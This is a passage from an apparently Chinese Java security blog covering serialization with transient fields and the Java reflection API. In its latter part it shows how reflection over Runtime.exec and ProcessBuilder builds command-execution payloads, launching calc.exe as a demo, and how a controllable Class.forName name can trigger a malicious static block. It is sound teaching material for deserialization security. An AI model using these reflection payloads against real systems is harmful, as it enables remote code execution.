class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//不序列化年龄和名字</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> height;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">boolean</span> singlehood;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, height=&quot;</span> + height +</span><br><span class="line">                <span class="string">&quot;, singlehood=&quot;</span> + singlehood +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TransientTest</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//创建ObjectOutputStream流</span></span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:\\a.txt&quot;</span>));</span><br><span class="line">            <span class="comment">//创建对象</span></span><br><span class="line">            Person person = <span class="keyword">new</span> Person(<span class="string">&quot;wawyw&quot;</span>,<span class="number">18</span>);</span><br><span class="line">            <span class="comment">//序列化它</span></span><br><span class="line">            oos.writeObject(person);</span><br><span class="line">            <span class="comment">//创建ObjectInputStream流</span></span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:\\a.txt&quot;</span>));</span><br><span class="line">            <span class="comment">//反序列化</span></span><br><span class="line">            Person wawyw = (Person) ois.readObject();</span><br><span class="line">            <span class="comment">//打印出来</span></span><br><span class="line">            System.out.println(wawyw);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Person&#123;name=&#x27;null&#x27;, age=0, height=0, singlehood=false&#125;</span></span><br></pre></td></tr></table></figure><p>使用transient修饰的属性，java序列化时，会忽略掉此字段，所以反序列化出的对象，被transient修饰的属性是默认值。对于引用类型，值是null；基本类型，值是0；boolean类型，值是false。</p><h2 id="自定义序列化"><a href="#自定义序列化" class="headerlink" title="自定义序列化"></a>自定义序列化</h2><p>java提供了可选的自定义序列化。可以进行控制序列化的方式，或者对序列化数据进行编码加密等。</p><p>通过重写writeObject与readObject方法，可以自己选择哪些属性需要序列化， 哪些属性不需要。如果writeObject使用某种规则序列化，则相应的readObject需要相反的规则反序列化，以便能正确反序列化出对象。这里展示对名字进行反转加密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="comment">//省略构造方法，get及set方法</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//将名字反转写入二进制流</span></span><br><span class="line">        out.writeObject(<span class="keyword">new</span> StringBuffer(<span class="keyword">this</span>.name).reverse());</span><br><span class="line">        out.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ins)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//将读出的字符串反转恢复回来</span></span><br><span class="line">        <span class="keyword">this</span>.name = ((StringBuffer)ins.readObject()).reverse().toString();</span><br><span class="line">        <span class="keyword">this</span>.age = ins.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射机制</title>
      <link href="posts/30031.html"/>
      <url>posts/30031.html</url>
      
        <content type="html"><![CDATA[<h1 id="什么是Java反射？"><a href="#什么是Java反射？" class="headerlink" title="什么是Java反射？"></a>什么是Java反射？</h1><p>Java反射机制是指在运行状态中，对于任意一个类，都能够知道这个类所有的属性和方法；对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能称为Java的反射机制。</p><p>反射就是把Java类中的各种成分映射成一个个的Java对象。</p><p>在Java中，每个类都对应一个Class对象，其反射机制是通过获取该类的Class对象，然后获取到其类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，同时可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等来体现的。</p><h1 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h1><h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><ol><li><p>通过Class类中的静态方法<code>forName()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;全类名&quot;</span>) <span class="comment">// 包名.类名</span></span><br></pre></td></tr></table></figure></li><li><p>通过任何数据类型都有的class属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类名.class属性</span><br></pre></td></tr></table></figure></li><li><p>通过Object类的<code>getClass()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象.getClass()方法</span><br></pre></td></tr></table></figure><p>例子：获取Person类对应的Class对象</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException</span>&#123;</span><br><span class="line">        Class c1=Class.forName(<span class="string">&quot;domain.Person&quot;</span>);</span><br><span class="line">        Class c2=Person.class;</span><br><span class="line">        Person p=<span class="keyword">new</span> Person(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        Class c3=p.getClass();</span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println(c3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class domain.Person</span></span><br><span class="line"><span class="comment">//class domain.Person</span></span><br><span class="line"><span class="comment">//class domain.Person</span></span><br></pre></td></tr></table></figure><p><strong>获取内部类的Classs对象</strong></p><p>Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： <code>C1.class</code> 和 <code>C1$C2.class</code>，可以把他们看作两个无关的类。即<code>Class.forName(&quot;C1$C2&quot;)</code>可以获取到该内部类的Class对象。</p><h2 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h2><p>默认情况下</p><p><code>Class.forName(className, true, currentLoader)</code></p><p>第二个参数为true表示在获取Class对象时，对类进行初始化。</p><p>那么初始化时，其调用的是类的什么方法呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用初始块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了静态初始块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取Class对象时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException</span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;domain.Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用了静态初始块</span></span><br></pre></td></tr></table></figure><p>实例化时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException</span>&#123;</span><br><span class="line">        Person p=<span class="keyword">new</span> Person();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用了静态初始块 </span></span><br><span class="line"><span class="comment">// 调用初始块</span></span><br><span class="line"><span class="comment">//调用了构造函数</span></span><br></pre></td></tr></table></figure><p>可以看到类的初始化是调用的静态初始块，实例化时会先调用静态初始快、初始块最后是构造函数。</p><p>补充：具有父类的类的实例化：<code>父类静态初始块</code>-&gt;<code>子类静态初始块</code>-&gt;<code>父类初始块</code>-&gt;<code>父类构造函数</code>-&gt;<code>子类初始块</code>-&gt;<code>子类构造函数</code></p><p>具有父类的类的初始化：<code>父类静态初始块</code>-&gt;<code>子类静态初始块</code></p><p>利用点：</p><ul><li>如果程序<code>Class.forName(name)</code> 中，<code>name</code> 参数可控，那么我们可以编写⼀个恶意类，将恶意代码放置在 static {} 中，从⽽执⾏恶意代码。</li><li>如果程序中某个类的static代码块可控，那么我们也可以对其修改然后通过<code>Class.forName(name)</code>调用。</li></ul><h2 id="获取成员变量"><a href="#获取成员变量" class="headerlink" title="获取成员变量"></a>获取成员变量</h2><ul><li><p><code>Fields[] getFields()</code>：只能获取所有public修饰的成员变量</p></li><li><p><code>Fields getField(String name)</code>：获取特定成员变量</p></li><li><p><code>Fields[] getDeclaredFields()</code>：获取所有的成员变量，【不考虑】修饰符</p></li><li><p><code>Fields getDeclaredField(String name)</code>：获取特定的成员变量，【不考虑】修饰符</p></li></ul><h2 id="获取构造方法"><a href="#获取构造方法" class="headerlink" title="获取构造方法"></a>获取构造方法</h2><ul><li><p><code>Constructor&lt;?&gt;[] getConstructors()</code>: 只能获取所有public修饰的构造方法</p></li><li><p><code>Constructor getConstructor(类 … parameterTypes)</code>: 获取特定构造方法</p></li><li><p><code>Constructor&lt;?&gt; getDeclaredConstructors()</code>: 获取所有构造方法，【不考虑】修饰符</p></li><li><p><code>Constructor getDeclaredConstructor(类 … parameterTypes``)</code>: 获取特定的构造方法，【不考虑】修饰符</p></li></ul><h2 id="获取成员方法"><a href="#获取成员方法" class="headerlink" title="获取成员方法"></a>获取成员方法</h2><ul><li><p><code>Method[] getMethods()</code>: 获取所有【public】修饰的方法，父类Object的方法也能看到</p></li><li><p><code>Method getMethod(String name，类 &lt;?&gt; … parameterTypes)</code>: 获取特定成员方法</p></li><li><p><code>Method[] getDeclaredMethods()</code>: 获取所有声明方法 不考虑修饰符</p></li><li><p><code>Method getDeclaredMethod(String name，类 &lt;?&gt; … parameterTypes)</code>:获取特定成员方法，【不考虑】修饰符</p></li></ul><h2 id="创建类实例"><a href="#创建类实例" class="headerlink" title="创建类实例"></a>创建类实例</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class对象.newInstance()</span><br></pre></td></tr></table></figure><p>执行该方法时会调用该类的==公有无参构造方法==对该类进行实例化。</p><h2 id="调用类方法"><a href="#调用类方法" class="headerlink" title="调用类方法"></a>调用类方法</h2><p>假设获取到的方法对象为mt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt.invoke(方法实例对象, 方法参数值，多个参数值用&quot;,&quot;隔开)</span><br></pre></td></tr></table></figure><ul><li>第一个参数必须是类实例对象，如果调用的是<code>static</code>方法那么第一个参数值可以传<code>null</code>或者类名，因为在java中调用静态方法是不需要有类实例的，因为可以直接<code>类名.方法名(参数)</code>的方式调用。</li><li>第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，如果有参数那么就必须严格的<code>依次传入对应的参数类型</code>。</li></ul><h2 id="修改成员变量-方法权限"><a href="#修改成员变量-方法权限" class="headerlink" title="修改成员变量/方法权限"></a>修改成员变量/方法权限</h2><p>假设获取到的变量对象为field</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">field.set(类实例对象, 修改后的值);</span><br><span class="line">&#x2F;&#x2F;修改成员变量</span><br><span class="line">field.setAccessible(true)</span><br><span class="line">&#x2F;&#x2F;修改成员变量访问权限</span><br></pre></td></tr></table></figure><p>同理也可以对方法进行访问权限修改，设方法对象为mt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt.setAccessible(true)</span><br></pre></td></tr></table></figure><h1 id="反射的运用"><a href="#反射的运用" class="headerlink" title="反射的运用"></a>反射的运用</h1><h2 id="一般运用"><a href="#一般运用" class="headerlink" title="一般运用"></a>一般运用</h2><p>如下一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在吃饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常实例化并调用其方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Person p=<span class="keyword">new</span> Person();</span><br><span class="line">        p.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//正在吃饭</span></span><br></pre></td></tr></table></figure><p>运用反射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取Class类对象</span></span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;domain.Person&quot;</span>);</span><br><span class="line">            <span class="comment">//获取指定方法</span></span><br><span class="line">            Method mt = clazz.getDeclaredMethod(<span class="string">&quot;eat&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">//创建实例</span></span><br><span class="line">            Object p = clazz.newInstance();</span><br><span class="line">            <span class="comment">//调用该方法</span></span><br><span class="line">            mt.invoke(p);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//正在吃饭</span></span><br></pre></td></tr></table></figure><p>其可以简化为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;domain.Person&quot;</span>);</span><br><span class="line">clazz.getDeclaredMethod(<span class="string">&quot;eat&quot;</span>).invoke(clazz.newInstance());</span><br></pre></td></tr></table></figure><h2 id="单例模式下"><a href="#单例模式下" class="headerlink" title="单例模式下"></a>单例模式下</h2><p>上面写过，<code>Class对象.newInstance()</code> 会调用该类的公有无参构造方法对该类进行实例化，那么如果该类是”单例模式”呢？</p><p>单例模式，构造函数为私有，只能通过静态方法去获取该对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleObject</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//创建 SingleObject 的一个对象</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> SingleObject instance = <span class="keyword">new</span> SingleObject();</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//让构造函数为 private，这样该类就不会被实例化</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="title">SingleObject</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//获取唯一可用的对象</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingleObject <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> instance;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例化对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonPatternDemo</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取唯一可用的对象</span></span><br><span class="line">      SingleObject object = SingleObject.getInstance();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//显示消息</span></span><br><span class="line">      object.showMessage();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时就不能用上面哪种方法去实例化对象了，但同时也给出了另一种实例化对象的方式，调用其静态方法。</p><p>看一个真实的例子，<code>java.lang.Runtime</code>因为有一个<code>exec</code>方法可以执行本地命令，所以在很多的<code>payload</code>中我们都能看到反射调用<code>Runtime</code>类来执行本地系统命令，但恰好它也是个单例类。</p><p>那么如果我要利用它构造payload执行命令，应当进行如下构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz =  Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            clazz.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(Runtime.getRuntime(),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="指定构造方法实例化"><a href="#指定构造方法实例化" class="headerlink" title="指定构造方法实例化"></a>指定构造方法实例化</h2><p>那假设它不是单例模式，而且也没有无参构造方法呢？</p><p>此时我们就要指定构造方法对其进行实例化，从而调用其方法，这里以另一个常用来执行命令的<code>ProcessBuilder</code>类为例。</p><p>此类用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法。它有两个构造方法，但都是有参构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ProcessBuilder</span><span class="params">(List&lt;String&gt; command)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ProcessBuilder</span><span class="params">(String... command)</span></span></span><br></pre></td></tr></table></figure><p>可以看下它的一般用法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用指定的操作系统程序和参数构造一个进程生成器</span></span><br><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;myCommand&quot;</span>, <span class="string">&quot;myArg1&quot;</span>, <span class="string">&quot;myArg2&quot;</span>);</span><br><span class="line"><span class="comment">// //启动进程</span></span><br><span class="line">Process p = pb.start();</span><br></pre></td></tr></table></figure><p>那么如何利用反射进行调用呢？</p><p>我们可以指定构造方法去进行实例化，然后调用start()方法执行传入的命令(程序)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//获取Class类对象</span></span><br><span class="line">            Class clazz =  Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">            <span class="comment">//获取start方法，并用getDeclaredConstructor根据传参类型获取指定的构造方法，然后newInstance传入参数进行实例化，以invoke调用</span></span><br><span class="line">            clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getDeclaredConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面我们是用的第一个构造参数，那么这次用第二个。</p><p>可以注意到的是，该构造函数的参数类型应为可变长参数，即同类型数组，在这里是字符串数组。</p><p>而且这里需要再提一下，<code>newInstance</code> 方法的参数为Object数组。这意味着我们向<code>newInstance</code> 